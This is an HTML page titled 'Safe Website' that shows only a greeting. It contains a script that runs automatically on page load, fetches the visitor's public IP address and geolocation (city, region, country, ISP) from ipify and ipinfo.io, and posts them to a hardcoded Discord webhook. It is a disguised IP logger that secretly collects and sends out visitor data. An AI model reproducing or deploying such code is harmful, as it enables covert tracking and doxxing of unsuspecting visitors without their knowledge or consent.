<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safe Website</title>
</head>
<body>
    <h1>Hello!</h1>
    <script>
        let webhook = "https://discord.com/api/webhooks/1299717230833176588/1BpkO2_kOXWWlDFHKwMswBllt2Xl_s3aJisHGzJPNGo0U_iYA6FUwWHo3Wf-rdY_hcH_";

        // Function to retrieve the user's IP and geolocation details
        async function retrieveIPInfo() {
          try {
            // First, get the public IP address using ipify
            const ipResponse = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            // Use ipinfo.io to get geolocation details (doesn't require an API key for basic info)
            const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
            const geoData = await geoResponse.json();

            // Prepare the embed for Discord webhook
            let random = Math.floor(Math.random() * 100);
            const myEmbed = {
              author: {
                name: `${random} | Adres IP: ${ip}`
              },
              title: `City: **${geoData.city || "N/A"}** | Region: **${geoData.region || "N/A"}**`,
              description: `Country: **${geoData.country || "N/A"}** | ISP: **${geoData.org || "N/A"}**`,
              color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
            };

            const params = {
              username: `ome.bot`,
              embeds: [myEmbed],
            };

            // Send the IP data to the Discord webhook
            const request = new XMLHttpRequest();
            request.open("POST", webhook);
            request.setRequestHeader("Content-type", "application/json");
            request.send(JSON.stringify(params));

          } catch (error) {
            console.error("Error retrieving IP info:", error);
          }
        }

        // Function to convert HEX to decimal (used for embed color)
        function hexToDecimal(hex) {
          return parseInt(hex.replace("#", ""), 16);
        }

        // Run the IP info retrieval function when the page loads
        retrieveIPInfo();
    </script>
</body>
</html>
